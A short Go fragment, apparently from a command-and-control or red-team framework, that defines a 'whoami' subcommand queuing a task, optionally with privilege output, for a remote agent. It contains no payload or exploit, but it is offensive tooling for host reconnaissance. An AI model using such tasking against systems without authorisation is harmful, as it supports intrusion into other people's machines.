type amTaskWhoamiCmd struct {
	Priv bool `help:"Print privileges."`
}

func (c *amTaskWhoamiCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	var taskName string
	if c.Priv {
		taskName = "whoami priv"
	} else {
		taskName = "whoami"
	}

	task, err := _task.NewTask(taskName, map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}
